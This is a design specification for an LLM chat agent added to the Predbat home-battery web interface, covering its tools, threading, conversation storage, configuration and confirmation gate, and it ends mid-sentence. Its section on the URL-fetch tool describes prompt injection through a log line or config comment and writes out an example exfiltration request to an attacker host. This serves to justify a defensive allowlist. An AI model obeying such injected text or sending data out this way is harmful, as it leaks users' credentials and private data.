# Predbat Web Chat Agent — Design

Date: 2026-08-27
Status: Approved for implementation planning

**Prerequisite:** this design assumes the nine-tool MCP surface from PR #4775
(`feat/mcp-log-and-apps-redaction-4768`) — `get_log`, `get_state`, and `get_apps` with its
`masked` argument, plus `is_secret_key` and `DEBUG_EXCLUDE_LIST` in `utils.py`. On `main` there
are seven tools and `_execute_get_apps` returns `self.base.args` verbatim with no redaction at
all, which would send every credential to a third-party model. `feat/web-chat-agent` is
therefore branched from #4775 and rebases onto `main` once that merges.

## 0. Changes since approval

This spec was approved before implementation and the design moved while it was built. The
sections below have been amended in place where they described configuration that no longer
exists; this list covers the material divergences so a reader knows which decisions were revisited
and why.

- **The endpoint is not necessarily OpenRouter.** Any OpenAI-compatible API works, including a
  local Ollama, verified against a real server. The single flat `openrouter_*` connection became
  a `chat:` block of named providers (§9.1), since a hosted model and a local one can both be
  worth having configured at once.
- **The component always starts**, with no required arguments. The original gating meant an
  unconfigured install had no component - but the Chat tab configures its own providers by
  writing `apps.yaml`, so the component must exist before any provider does.
- **The model is optional.** Chosen in the UI and remembered, so an install with only a key gets
  a working tab rather than none.
- **`chat_max_tool_calls` is `chat_max_tool_rounds`**, which is what it always bounded: every
  tool call inside one round already runs.
- **One timeout became two.** `chat_turn_timeout` (whole turn) and `chat_request_timeout` (one
  completion) bound different things; sharing a value killed multi-round turns on their total
  budget even when no single request was slow.
- **Approvals and errors are persisted beside the conversation**, not among its messages, so they
  survive a reconnect without ever being replayed to the model.
- **Documentation is read by section, not by page.** `search_docs` returns a section id and
  `read_docs` returns that section: fetching a whole docs page cost about 35,000 tokens where a
  section answers the question in one or two.
- **Credential redaction is recursive.** `mask_secret_args()` walked only top-level keys, so a
  credential nested one level down - `forecast_solar[].api_key`, or anything in the `chat:` block
  - was returned to the model in the clear.

## 1. Purpose

Add a **Chat** tab to the Predbat web interface, backed by an LLM served through OpenRouter,
that can answer questions about the user's own system and change its settings. The agent is
given Predbat's existing tool set directly as function-calling tools, so it can read the plan,
the log, the live configuration, `apps.yaml` and Predbat's internal state, and — behind a
confirmation gate — change a setting or override a plan slot. It can also search and read the
Predbat documentation and Predbat's own source code, so "how do I configure X" and "what does
this code actually do" are answerable as well as "what is my system doing".

The feature exists so a user can ask *"why is it charging at 3am?"* or *"my export slot
vanished, what happened?"* and get an answer grounded in their actual data, without having to
export a debug YAML, open an issue, or wire up an external MCP client.

Scope for this first implementation:

- A new `chat` component, enabled only when OpenRouter credentials and a model are configured
  in `apps.yaml`.
- A shared tool layer, extracted from the MCP server so both surfaces call one implementation.
- Chat-local tools the MCP server does not get: the conversation title, documentation search,
  source-code search and read, and an allowlisted URL fetch.
- Multiple saved conversations with a switcher, persisted through the Storage component. One
  turn runs at a time across the whole component; other conversations stay readable while it does.
- Server-sent-event streaming of tokens, tool calls and confirmations to the browser.
- A write-confirmation gate, on by default, controlled by a Predbat switch.
- A model picker, per conversation, defaulting to the `apps.yaml` model.
- Optional OpenRouter web search, behind a switch that is off by default.

Explicitly out of scope, listed in section 19.

## 2. Why not drive the existing MCP server

The chat agent does **not** speak MCP. It presents the tools to the model directly in
OpenAI function-calling form and executes them in-process.

Speaking MCP would mean the chat component acting as an HTTP MCP client against Predbat's own
MCP server: a second port, an OAuth or bearer handshake against ourselves, a JSON-RPC envelope
in each direction, and a hard dependency on `mcp_enable` being switched on. All of that to
reach Python methods that are already in the same process. The protocol buys nothing here —
its value is crossing a process boundary, and there is no boundary to cross.

The MCP tool set is also much richer than the real REST API, which is only `/api/state` and
`/api/service` (`docs/rest_api.md`). Routing chat through HTTP endpoints would mean first
building seven new REST endpoints to reach parity. The tools are therefore extracted into a
shared Python layer that both the MCP server and the chat agent project into their own schema
dialect.

## 3. The constraint that shapes everything: one thread per component

`Hass.create_task()` (`apps/predbat/hass.py:223`) starts a **new thread** per component, each
running its own `asyncio.run()`. Components therefore do not share an event loop.

The existing house pattern, seen in `WebInterface.html_component_restart`
(`apps/predbat/web.py:4866`), is for a web handler to `await` another component's coroutine
directly — which executes that coroutine on the *web* component's loop, not the owning
component's. This works only because those coroutines hold no loop-bound state.

**The chat component must obey the same rule.** Concretely:

- `aiohttp.ClientSession` is created per request inside an `async with`, as `axle.py:250` does.
  No session is cached on the component.
- Shared state (conversation index, message bodies, event buffer, pending confirmations) uses
  plain lists/dicts guarded by a `threading.Lock`, never `asyncio.Queue`, `asyncio.Event` or
  `asyncio.Lock`.
- The confirmation gate is polled, not awaited on a synchronisation primitive: the parked
  turn loops on `await asyncio.sleep(0.2)` reading `pending_confirm` under the lock. This
  needs no thread and no loop-bound object, and matches the cursor polling the SSE handler
  already uses.

The chat component's own thread does only housekeeping: periodic persistence flush, pruning and
the health timestamp. The agentic turn itself runs on whichever loop invoked it, which in
practice is the web server's.

This is a deliberate departure from how a component would normally own its work, and it is the
reason the design is testable without a web server: `ChatAgent.run_turn()` is an ordinary
coroutine that can be awaited from a test.

## 4. Architecture

Five new files, one refactor. No existing module changes behaviour except `web_mcp.py`, which is
refactored without changing its contract, and the small hooks in `web.py`, `web_helper.py`,
`components.py` and `config.py`.

| File | Contents |
| ---- | -------- |
| `apps/predbat/agent_tools.py` | `PredbatTools` and `TOOL_DEFS`; the single implementation of the nine Predbat tools, shared with MCP |
| `apps/predbat/chat_store.py` | `ConversationStore`; the conversation index, bodies, persistence, expiry, pruning and history trimming |
| `apps/predbat/chat_tools.py` | `CHAT_TOOL_DEFS` and the chat-local tool implementations: documentation search, source search and read, and the allowlisted URL fetch |
| `apps/predbat/chat.py` | `ChatAgent(ComponentBase)`; OpenRouter client, agentic loop, chat-local tools, confirmation gate |
| `apps/predbat/web_chat.py` | `WebChat`; the Chat tab page and its routes |
| `apps/predbat/web_mcp.py` | *refactored*: `MCPServerWrapper(PredbatTools)`, keeping only the protocol envelope |

```text
browser ──HTTP/SSE──▶ web_chat.WebChat ──await──▶ chat.ChatAgent ──HTTPS──▶ OpenRouter
                                                        │
                                                        ├─▶ agent_tools.PredbatTools ─▶ base (PredBat)
                                                        │              ▲
                                                        │  MCP client ─┴─JSON-RPC─▶ web_mcp.MCPServerWrapper
                                                        ├─▶ chat_store.ConversationStore ─▶ storage
                                                        └─▶ chat_tools (docs, source, fetch)
```

Splitting the conversation store and the chat-local tools out of `chat.py` keeps each file to
one job: the component file is the agent loop and nothing else, and both of the others are
testable with no LLM in sight.

## 5. Tools

### 5.1 `PredbatTools` — the shared nine

`PredbatTools` takes `(base, log_func)` and holds the nine `_execute_*` coroutines lifted
verbatim out of `MCPServerWrapper`, together with the module-level helpers they use
(`json_safe_value`, `summarise_state_value`, `measure_state_value`, `parse_number_argument`,
`compile_filter_argument`, `parse_bool_argument`, `MCPArgumentError`) and their constants
(`LOG_FILTER_TYPES`, `MCP_LOG_*`, `MCP_STATE_*`).

The constants keep their `MCP_` prefix. Renaming them would churn
`apps/predbat/tests/test_web_mcp.py` for no benefit, and they describe the tool contract rather
than the protocol.

`web_mcp.py` re-exports every moved name (`from agent_tools import PredbatTools, LOG_FILTER_TYPES, ...`)
so existing imports in tests and elsewhere continue to resolve.

`MCPServerWrapper` becomes `class MCPServerWrapper(PredbatTools)` and keeps only OAuth, the
JSON-RPC envelope, `_handle_initialize`, `_handle_tools_list` and `_handle_tools_call`. Because
it inherits the handlers, existing tests that call `mcp._execute_get_log(...)` keep working
untouched.

### 5.2 `TOOL_DEFS` and the two projections

A module-level list, one entry per tool, in the order the MCP server lists them today:

```python
TOOL_DEFS = [
    {
        "name": "get_apps",
        "description": "Get predbat apps.yaml static configuration data, ...",
        "parameters": {"type": "object", "properties": {...}, "required": []},
        "writes": False,
        "chat_omit_properties": ["masked"],
    },
    ...
]
```

| Field | Meaning |
| ----- | ------- |
| `name`, `description`, `parameters` | Exactly the values the MCP server publishes today |
| `writes` | `True` for `set_config` and `set_plan_override`, `False` for the other seven. It means "changes Predbat's configuration or plan", which is what the confirmation gate is about — not "has any side effect" |
| `chat_omit_properties` | Properties removed from the *chat* projection only (section 14.1) |

Two projections and one dispatcher:

- `mcp_tool_list()` → `[{"name", "description", "inputSchema": parameters}]`
- `openai_tool_list(defs=TOOL_DEFS)` → `[{"type": "function", "function": {"name", "description", "parameters"}}]`,
  with `chat_omit_properties` stripped from `properties`
- `async execute(name, arguments)` → the tool's result dict, or
  `{"success": False, "error": "Unknown tool: ..."}`

`_handle_tools_list` becomes `return {"tools": mcp_tool_list()}` and `_handle_tools_call`
becomes `execute()` plus the MCP content envelope. A golden test asserts `mcp_tool_list()` is
identical to the list `web_mcp.py` publishes today, so the refactor cannot silently change the
MCP contract.

### 5.3 `CHAT_TOOL_DEFS` — five tools MCP does not get

Defined in `chat_tools.py`, in the same shape, and projected with the same
`openai_tool_list(CHAT_TOOL_DEFS)` helper. The model is offered
`openai_tool_list() + openai_tool_list(CHAT_TOOL_DEFS)`; dispatch tries the chat-local handlers
first and falls through to `PredbatTools.execute()`.

They are chat-local for two different reasons. `set_chat_title` needs the conversation the turn
belongs to, which `PredbatTools` knows nothing about. The other four are not about the user's
Predbat instance at all, and an MCP client already has its own file and web tools — adding ours
would be noise in someone else's tool list.

| Tool | Arguments | Returns |
| ---- | --------- | ------- |
| `set_chat_title` | `title` (string) | Sets the current conversation's title |
| `search_docs` | `query` (string), `max_results` (integer, default 5, max 10) | `[{title, url, excerpt}]` from the Predbat documentation |
| `search_source` | `pattern` (regex string), `file` (string, optional), `max_results` (integer, default 20, max 100) | `[{file, line, text}]` plus `total_matches` |
| `read_source` | `file` (string), `start_line` (integer, default 1), `max_lines` (integer, default 200, max 400) | Numbered source lines plus `total_lines` |
| `fetch_url` | `url` (string) | The page as text, subject to the allowlist in section 7.3 |

None of the five has `writes: True` — none changes Predbat's configuration or plan, so none
goes through the confirmation gate. The source tools are read-only by construction; `fetch_url`
is the security-sensitive one, for the reasons in section 7.3.

## 6. Conversation titles

Titles come from the model. The system prompt says, when and only when the conversation is still
called `New chat`:

> This conversation has no title yet. Call `set_chat_title` once, early in your reply, with a
> short descriptive title of at most 60 characters summarising what the user is asking about.

`set_chat_title` trims the string, collapses whitespace, truncates to 60 characters, rejects an
empty result, updates the conversation metadata, marks it dirty and emits a `title` event so
every open browser relabels the row live.

**A fallback is still required.** Weaker models ignore instructions, and a conversation stuck at
`New chat` is worse than a crude title. So if the conversation is still untitled when the first
turn ends, the title is derived from the first user message — whitespace collapsed, truncated to
60 characters. The model gets first refusal; the fallback guarantees an answer.

A later `set_chat_title` call is accepted rather than refused, since a conversation that has
genuinely changed topic is better retitled. The prompt only mentions the tool while untitled, so
this should be rare. The user can always rename by hand.

Titles are user-influenced text and are escaped before rendering (section 14.7).

## 7. Documentation, source code and the web

### 7.1 `search_docs`

Predbat's documentation is not on disk — `download.py` installs only `apps/predbat/*`, not
`docs/`. The published MkDocs site does ship a search index at
`https://springfall2008.github.io/batpred/search/search_index.json`, shaped
`{config, docs: [{location, title, text}]}`.

`search_docs` fetches that index through
`storage.fetch_cached("chat", "docs_index", ..., fresh_minutes=1440, format="json")`, keeps one
parsed copy on the component, and scores records locally: query terms of three characters or
more, lowercased, counted across `title` (weighted) and `text`. It returns the top `max_results`
as `{title, url, excerpt}`, where `url` is the site root joined to `location` and `excerpt` is
roughly 300 characters around the best match.

One cached fetch a day, no third-party search service, no per-query cost, and it works whatever
the configured provider points at. The URL is hardcoded, so this tool carries none of the risk in
section 7.3.

If the index cannot be fetched, the tool returns
`{"success": false, "error": "Documentation index unavailable"}` and the model falls back to
what it knows.

**Documentation is fetched rather than shipped, deliberately.** Installing `docs/` alongside the
source would make this tool offline and exactly version-matched, which is the same argument that
puts source reading locally (section 7.2). It is rejected here because the cost lands in the
wrong place: `match_archive_member` (`apps/predbat/download.py:325`) accepts only files sitting
directly in `apps/predbat`, and staging is flat — `<filename>.<tag>` beside the installed file.
Shipping docs means teaching the updater a second root *and* nested paths, creating directories
during staging, extending the rollback that removes staged files, and adding a second GitHub
directory listing — all inside the SHA1-verified staged-update path, which is the code whose
failure mode is a broken install. The published index already gives version-current
documentation for one cached request a day.

Should that trade ever change, `search_docs` can prefer a local `docs/` when one exists and fall
back to the index otherwise; `.md` is already on the source allowlist (section 7.2) so nothing
else would need to move.

### 7.2 `search_source` and `read_source` — local, not GitHub

**The source is already on disk.** Predbat is a Python application that reads its own directory
throughout (`os.path.dirname(os.path.abspath(__file__))`, the house pattern at
`apps/predbat/hass.py:26` and `apps/predbat/web.py:5372`), and `download.py` installs exactly
`apps/predbat/*`. Reading it needs no network at all.

Local beats GitHub on the thing that matters most for this feature: **the installed source is
the exact version the user is running.** Someone on an old release, or a dev branch, debugging
"why did my plan do that", is badly served by an answer drawn from whatever `main` looks like
today — a confidently wrong answer about code they are not running is worse than no answer. It
is also free, works offline, and is not subject to the 60-requests-an-hour unauthenticated
GitHub rate limit.

GitHub is not lost, either: `github.com` and `raw.githubusercontent.com` are already on the
`fetch_url` allowlist (section 7.3), so history, issues, pull requests and other branches remain
reachable when the model genuinely needs them rather than as the default path to the code.

`search_source(pattern, file=None, max_results=20)` walks the source root for source files,
skipping `venv/` and `__pycache__/`, and returns `{file, line, text}` for each regex match with the line
truncated to 300 characters, plus a `total_matches` count so a truncated result is visible as
truncated rather than silently short. `file` narrows the search to one path.

`read_source(file, start_line=1, max_lines=200)` returns a numbered slice plus `total_lines`, so
the model can page through `plan.py` rather than trying to swallow it. Search first, read second:
`predbat.py` and `plan.py` are thousands of lines, and no whole-file read is ever offered.

Both enforce:

1. The path is resolved with `os.path.realpath` and must remain under the realpath of the source
   root, which blocks `../` traversal and symlinks pointing outward.
2. **The extension must be on the allowlist**: `.py`, `.cpp`, `.h`, `.hpp`, `.proto`, `.sh`,
   `.md`. That covers every file type Predbat's source actually uses — 312 `.py`, the
   `prediction_kernel.cpp`, two `.proto` defining the Enphase and gateway wire formats, two
   build `.sh` that answer "why will the kernel not build on my Pi" — plus `.h`/`.hpp` so a
   future kernel header split needs no change here, and `.md` so the tool works unchanged if
   documentation ever lands locally (section 7.1). It is deliberately an **allowlist, not a
   denylist**, and deliberately an extension rule rather than a directory rule. Section 7.2.1
   explains why.
3. `venv/` and `__pycache__/` are skipped, or a search would drag in every installed dependency.
4. Caps: 100 matches, 400 lines, 64 KB per response, and a wall-clock budget on the scan. A
   pattern over 200 characters, or one `re.compile` rejects, returns a plain error rather than
   raising.

Predbat's source is a public repository, so this exposes nothing that is not already public.
The guards exist to stop the tool reaching *beyond* the source into configuration and logs.

#### 7.2.1 Why an allowlist rather than "everything except `.yaml`"

A directory rule cannot work, because the source directory and the configuration directory can
be the same one. `CONFIG_ROOTS` is `["/config", "/conf", "/homeassistant", "./"]`
(`apps/predbat/const.py:33`), so `config_root` falls back to the working directory — which for
a Docker or from-source run is the source directory itself. `StorageLocalFiles` then puts its
cache at `config_root/cache` (`apps/predbat/storage.py:199`), inside the tree being searched.

A checkout additionally carries `apps/predbat/config/apps.yaml` and `config/secrets.yaml`.
Those are not present on an add-on install, because `match_archive_member`
(`apps/predbat/download.py:325`) installs only files sitting *directly* in `apps/predbat` and
excludes every subdirectory — but anyone running Predbat from a clone has them right there.

That makes the source tree a plausible home for all of the following:

| File | Why excluding only `.yaml` would not be enough |
| ---- | --------------------------------------------- |
| `cache/*.json` | Storage cache — whatever components persisted, including OAuth tokens |
| `predbat.log` | Up to 10 MB, and the raw log is what `get_log` deliberately filters |
| `*.bak` | A backup of a config file wears the backup's extension, not the original's |
| `*.so`, `*.pyc` | Megabytes of binary, useless in a context window |
| `*.yml` | The same YAML with the other spelling |
| `.env` | Not present today; nothing stops a user adding one |

A denylist has to anticipate every extension a secret might arrive wearing, and is wrong the
first time one arrives in a new one. An allowlist only has to name the extensions source code
wears, which is a closed and short list. The cost of being wrong is asymmetric — a missing
extension means the agent cannot read one file, while a missing denylist entry means credentials
go to a third-party model — so the allowlist is the right default even though it is the less
convenient one.

If a user genuinely needs another extension, widening the constant is a one-line change with a
visible diff, which is the right place for that decision to be made.

### 7.3 `fetch_url` and why it is fenced

An unrestricted fetch tool is an **exfiltration channel**, which matters more here than SSRF: a
prompt-injected log line or `apps.yaml` comment could steer the model into
`GET https://attacker.example/?d=<something it just read>`. The allowlist is the control that
closes it, and it is not optional.

`fetch_url` enforces, in order:

1. Scheme must be `https`.
2. Host must appear in the allowlist. Default
   `["springfall2008.github.io", "github.com", "raw.githubusercontent.com"]`, replaceable via
   `chat_fetch_allowlist` in `apps.yaml`. Matching is exact hostname or a `.suffix` match, never
   a substring — `evilspringfall2008.github.io` must not pass.
3. The hostname is resolved, and the request is refused if **any** returned address is private,
   loopback, link-local, reserved or multicast (`ipaddress.ip_address(...)`). This stops an
   allowlisted host that resolves inward.
4. Redirects are not followed automatically. Each hop is re-validated against steps 1-3, to a
   maximum of three.
5. Response `Content-Type` must be `text/*` or `application/json`; the body is capped at 200 KB
   and truncated with a visible note. HTML is reduced to text by stripping tags, scripts and
   styles.
6. Timeout 20 s.

Every rejection returns a plain error to the model naming the reason, so it can explain itself
rather than retry blindly. The call and its argument appear in the transcript like any other
tool call, so the user can see exactly what was fetched.

### 7.4 OpenRouter web search

OpenRouter provides web *search*, not fetch: `plugins: [{"id": "web"}]` (equivalently the
`:online` model suffix) injects search excerpts into the prompt with `url_citation` annotations,
backed by each provider's native search where available and Exa otherwise, at roughly
$0.001-0.015 per request.

A `chat_web_search` switch, **default off**, adds the plugin to the request body. When results
come back, the `url_citation` annotations are rendered as a sources list under the message.

Two honest caveats, both documented: it costs money per request, and it is an OpenRouter
feature — off OpenRouter the plugin is not sent at all, since it would be ignored at best by that
endpoint. The component logs a one-time warning when the switch is on and the base URL is not
OpenRouter, rather than letting the user wonder why nothing changed.

## 8. Component registration and gating

Added to `COMPONENT_LIST` in `apps/predbat/components.py`, phase 1, restartable:

```python
"chat": {
    "class": ChatAgent,
    "name": "AI Chat Agent",
    "can_restart": True,
    "phase": 1,
    "args": {
        "providers":         {"required": False, "config": "chat"},
        "api_key":           {"required": False, "config": "chat_api_key"},
        "base_url":          {"required": False, "config": "chat_api_url"},
        "api_type":          {"required": False, "config": "chat_api_type", "default": "auto"},
        "model":             {"required": False, "config": "chat_model"},
        "legacy_api_key":    {"required": False, "config": "openrouter_api_key"},
        "legacy_base_url":   {"required": False, "config": "openrouter_base_url"},
        "legacy_model":      {"required": False, "config": "openrouter_default_model"},
        "max_tokens":        {"required": False, "config": "openrouter_max_tokens", "default": 0},
        "max_tool_rounds":   {"required": False, "config": "chat_max_tool_rounds", "default": 32},
        "max_history":       {"required": False, "config": "chat_max_history", "default": 0},
        "max_conversations": {"required": False, "config": "chat_max_conversations", "default": 20},
        "expiry_days":       {"required": False, "config": "chat_expiry_days", "default": 30},
        "turn_timeout":      {"required": False, "config": "chat_turn_timeout", "default": 1800},
        "request_timeout":   {"required": False, "config": "chat_request_timeout", "default": 300},
        "fetch_allowlist":   {"required": False, "config": "chat_fetch_allowlist", "default": None},
    },
},
```

**Amended during implementation.** The spec originally gated the component on `required: True`
for the key and model, so an unconfigured install never constructed it. That was reversed: the
component now takes no required arguments and always starts, because the Chat tab configures its
own providers by writing `apps.yaml`, so the component has to be running before any provider
exists or there is nothing to configure it from. With none configured the tab shows a setup page
and no turn can be sent — `ChatAgent.provider_ready()` is what that keys off.

The model also stopped being required: it is chosen in the UI and remembered, so an install with
only a key gets a working tab rather than none.

`ChatAgent.run()` returns `True` on its first tick without any network I/O; it loads the
conversation index from storage and nothing else. Credentials are validated lazily on the first
turn. Validating at startup would let a slow or unreachable OpenRouter block Predbat's boot
inside `wait_api_started()` for up to ten minutes.

`run()` thereafter, once a minute: flush dirty conversations, prune, and
`update_success_timestamp()` so the Components tab shows the component as healthy.

## 9. Configuration

### 9.1 `apps.yaml`

The endpoint is described by a `chat:` block of named providers; `chat_*` keys describe
behaviour. All added to `APPS_SCHEMA` in `apps/predbat/config.py`.

**Amended during implementation.** The spec originally had a single flat `openrouter_*`
connection, on the assumption that OpenRouter was the endpoint. It is not: any OpenAI-compatible
API works, including a local Ollama, which was verified against a real server rather than
assumed. Since more than one can now be worth configuring at once - a hosted model and a local
one - the connection became a block of named entries rather than one set of keys.

```yaml
pred_bat:
  chat:
    openrouter:
      api_key: !secret openrouter_key
    ollama:
      url: 'http://localhost:11434/v1'
    nas:
      type: ollama
      url: 'http://192.168.1.50:11434/v1'
```

The dict key is the user's own name for an endpoint, not the provider type, so two Ollama servers
or two OpenRouter accounts are simply two entries. Each entry takes:

| Field | Required | Purpose |
| ----- | -------- | ------- |
| `url` | For a local endpoint | The OpenAI-compatible base URL. Defaults to the endpoint the resolved type normally lives at |
| `api_key` | For a hosted endpoint | Omitted for a local endpoint, which needs none |
| `type` | No | `openrouter`, `ollama`, `openai` or `local`. Falls back to the entry's name when that is itself a provider, then to detection from the url |

A provider is *usable* only when a turn sent to it would not fail immediately: a hosted endpoint
needs its key, a local one only needs to be pointed at. A half-configured entry is listed rather
than dropped, so the Chat tab can show what is missing.

| Key | Type | Required | Default | Purpose |
| --- | ---- | -------- | ------- | ------- |
| `chat` | dict | No | — | Named provider block, above |
| `chat_api_key` / `chat_api_url` / `chat_api_type` / `chat_model` | string | No | — | A single unnamed provider, read only when no `chat:` block exists |
| `openrouter_api_key` / `openrouter_base_url` / `openrouter_default_model` | string | No | — | The pre-rename names, still read so an existing `apps.yaml` keeps working |
| `openrouter_max_tokens` | integer | No | 0 (unset) | Per-response completion cap; omitted from the request when 0 |
| `chat_max_tool_rounds` | integer | No | 32 | Model round trips in one turn. Renamed from `chat_max_tool_calls`, which is what it always bounded: every call inside one round already runs |
| `chat_max_history` | integer | No | 0 (unlimited) | Messages retained per conversation |
| `chat_max_conversations` | integer | No | 20 | Visible conversations before the least recently used is hidden |
| `chat_expiry_days` | integer | No | 30 | Days of inactivity before a conversation expires from the cache |
| `chat_turn_timeout` | integer | No | 1800 | Wall-clock seconds for a whole turn, excluding time awaiting a confirmation |
| `chat_request_timeout` | integer | No | 300 | Wall-clock seconds for one completion request |
| `chat_fetch_allowlist` | string_list | No | docs site, `github.com`, `raw.githubusercontent.com` | Hosts `fetch_url` may reach |

`chat_turn_timeout` and `chat_request_timeout` were one value in the original spec. They bound
different things and conflating them meant a turn died on its total budget after two or three
completions even when no single request was slow.

An `api_key` matches the existing `_key` suffix heuristic, so it is redacted by
`mask_secret_args()` in the Apps view, the debug YAML and the `get_apps` tool. That function was
made recursive during implementation: it walked only top-level keys, so a credential nested
inside the `chat:` block - or inside `forecast_solar` - was returned to the model in the clear.

The provider block is documented rather than hidden. It is the supported way to point
Predbat at a local model, and an undocumented key that users discover from the source is worse
than a documented one.

### 9.2 `CONFIG_ITEMS`

Two new switches in `apps/predbat/config.py`:

```python
{"name": "chat_confirm_writes", "friendly_name": "Chat confirm before changing settings",
 "type": "switch", "default": True},
{"name": "chat_web_search", "friendly_name": "Chat web search (costs per request)",
 "type": "switch", "default": False},
```

Both surface in Home Assistant and the Config tab. `chat_confirm_writes` is read at the moment a
write tool is called, not cached at turn start, so toggling it takes effect immediately.

## 10. Conversations

### 10.1 Model

Many saved conversations; **one running turn at a time across the whole component**. While a
turn runs, every other conversation stays readable and switchable; only sending is locked, and
the lock is global rather than per-conversation. This keeps the concurrency story to a single
flag while still letting a user go and read something else during a slow turn.

A conversation is:

```python
{
    "id": "3f9a1c8e5b2d4a70",       # secrets.token_hex(8)
    "title": "Why is it charging at 3am",
    "created": "2026-08-27T09:14:02+01:00",
    "updated": "2026-08-27T09:18:44+01:00",
    "deleted": False,
    "model": "anthropic/claude-sonnet-4.5",   # None means "use the apps.yaml default"
    "usage_total": {"prompt_tokens": 0, "completion_tokens": 0, "cost": 0.0},
    "messages": [...],              # OpenAI format: user, assistant (with tool_calls), tool
}
```

Ids are `secrets.token_hex(8)` rather than slugified titles. Storage sanitises identifiers with
`_safe_name()` (`apps/predbat/storage.py:55`), which maps any unsafe character to `_` — so two
different human titles could collapse onto the same filename. Hex ids cannot.

### 10.2 Server state

Held by `ConversationStore` in `chat_store.py`, under a `threading.Lock`:

| Attribute | Contents |
| --------- | -------- |
| `index` | `id` → conversation metadata (everything but `messages`, plus `message_count`) |
| `bodies` | `OrderedDict` `id` → `messages`, an LRU cache of at most 5 loaded conversations |
| `dirty` | Set of ids with unflushed changes |

Held by `ChatAgent`:

| Attribute | Contents |
| --------- | -------- |
| `events` | Append-only global event buffer, each stamped with `seq` and `conversation_id` |
| `event_seq` | Next sequence number |
| `active` | `{"conversation_id", "turn_id", "title"}` while a turn runs, else `None` |
| `pending_confirm` | `call_id` → `{"conversation_id", "approved": bool or None, "expires": datetime}` |

There is deliberately **no server-side "current conversation"**. Which conversation a browser is
looking at is client state, held in `localStorage` and passed on every request. Two browsers can
therefore sit in different conversations without fighting over a shared cursor, and the only
global server state is `active`.

Bodies load lazily on first access and are evicted LRU beyond five, flushing first if dirty, so
twenty saved conversations do not have to sit in memory.

The system message is **not** stored — it is rebuilt from live data at the start of every turn
(section 12), so a restored conversation is never anchored to a stale snapshot.

### 10.3 Persistence and expiry

Through the Storage component, as CLAUDE.md requires. One index plus one file per conversation,
so a turn rewrites only the conversation it touched:

- `chat/index` → `{"version": 1, "conversations": [metadata, ...]}`
- `chat/conv_<id>` → `{"version": 1, "id": ..., "messages": [...]}`

Both `format="json"`. Both are saved with `expiry = now_utc + chat_expiry_days`, and every save
renews it — so the clock measures **inactivity**, and a conversation nobody has touched for 30
days ages out of the cache on its own. `StorageComponent.load()` already returns `None` for an
expired entry, so nothing has to sweep.

Written at the end of each turn and on the housekeeping tick when dirty, never per token. A
payload with an unrecognised `version` is discarded and logged rather than half-parsed.

The index self-heals: on load, any entry whose body `load()` returns `None` — expired, or file
gone — is dropped and the index rewritten.

### 10.4 Deletion is a flag, not a delete

Storage has no delete operation, and adding one to reach a single feature is not worth widening
the abstraction. Deleting a conversation therefore sets `deleted: True` in its index entry. A
deleted conversation is hidden from the list, refused by every route that takes an id, excluded
from the `chat_max_conversations` count and never loaded or re-saved — so its file stops being
renewed and expires on the normal `chat_expiry_days` clock.

The consequence is worth stating plainly rather than hiding: **a deleted conversation's file
remains in the cache directory for up to `chat_expiry_days`.** It is invisible in the UI but
readable by anyone with filesystem access. `docs/components.md` will say so, next to the
existing note that the web UI has no authentication.

Deleting the conversation with the active turn is refused with 409. There is no undelete in the
UI; the flag makes one easy to add later if anyone asks.

### 10.5 Pruning

Two independent limits:

- **Within a conversation**, `chat_max_history` messages (section 10.6).
- **Across conversations**, `chat_max_conversations`. When a new one is created, the least
  recently `updated` conversations beyond the cap are marked `deleted` — the same flag, the same
  expiry path — and a line is logged naming what went. The conversation with a running turn is
  never pruned.

### 10.6 History trimming — a trap worth stating

Trimming to "the last N messages" will eventually cut between an `assistant` message carrying
`tool_calls` and the `tool` messages answering them. OpenAI-compatible APIs reject that with a
400: every `tool_call_id` must have a matching `tool` message in the same request.

Trimming therefore walks backwards to the nearest **`user` message boundary** at or before the
cut point, so a kept window always begins a complete exchange. If no such boundary exists
within the window the whole conversation is kept and a warning is logged.

## 11. The agentic turn

```text
run_turn(conversation_id, text):
    claim active = {conversation_id, turn_id}, else raise Busy
    emit global "busy" event
    load body; append user message; emit "user" event
    for iteration in range(max_tool_calls + 1):
        messages = [system_snapshot()] + trim(body.messages)
        stream POST {base_url}/chat/completions
              {model: conversation.model or default, messages,
               tools: openai_tool_list() + openai_tool_list(CHAT_TOOL_DEFS),
               stream: true, usage: {include: true},
               [max_tokens], [plugins: [{"id": "web"}] if chat_web_search]}
        for each SSE chunk:
            content delta      -> emit "delta"
            tool_call delta    -> accumulate by index
            annotations        -> collect url_citations
            usage              -> emit "usage", add to conversation usage_total
        append assistant message; emit "assistant" (with sources, if any)
        if no tool_calls: break
        for each tool_call:
            if def.writes and chat_confirm_writes:
                emit "confirm"; await approval (section 13)
                if not approved: result = {"success": false, "error": "User declined"}
            else:
                emit "tool_start"; result = await dispatch(name, args); emit "tool_end"
            append tool message
    else:
        emit "assistant" with a visible "tool call limit reached" note
    if still untitled: apply the first-user-message fallback; emit "title"
    mark dirty; persist; emit "done"; clear active; emit global "idle"
```

`dispatch()` tries `CHAT_TOOL_DEFS` handlers first, binding `conversation_id` for
`set_chat_title`, then falls through to `PredbatTools.execute()`.

Notes:

- Tool-call deltas arrive fragmented across chunks and are keyed by `index`, not by `id` — the
  `id` and `name` appear only in the first fragment. The accumulator keys on `index`.
- Arguments arrive as a JSON string built up across chunks; malformed JSON at the end is
  reported back to the model as a tool error rather than raised, so it can retry.
- The whole turn is wrapped in `asyncio.wait_for(..., turn_timeout)`. Time parked awaiting a
  confirmation is excluded by pausing the deadline, otherwise a user who steps away turns their
  own approval into a timeout.
- `active` is claimed and released under the lock, and released in a `finally`, so a crashed
  turn cannot wedge the tab. The `idle` event is emitted on every exit path.

## 12. System prompt and the live snapshot

The system message is rebuilt each turn from three parts.

**A static primer** — a short paragraph on what Predbat is, that the user is the system owner,
that answers should be concise and reference real values, that it should call a tool rather
than guess, that `search_docs` is the way to answer configuration questions and
`search_source` then `read_source` the way to answer "what does the code do", that the source it
can read is the exact version running, and that it must never invent an entity name.

**A live snapshot**, roughly 400-800 tokens, assembled from `self.base`: current time and
timezone, mode, `soc_kw`/`soc_max`/`soc_percent`, reserve, current import and export rate, the
next charge window and next export window with times and limits, `status`, `had_errors`,
inverter count and types, number of cars, the currency symbol, and the running Predbat version
so the model knows which source it is looking at.

**The title instruction** (section 6), included only while the conversation is untitled.

The snapshot answers the commonest questions with zero tool calls and stops weaker models
answering from nothing. Everything deeper — the full plan, the log, `apps.yaml`, internal state
— stays behind a tool call, which is what keeps the per-turn cost bounded.

Snapshot assembly is a pure function of `base` state, isolated in `chat.py` as
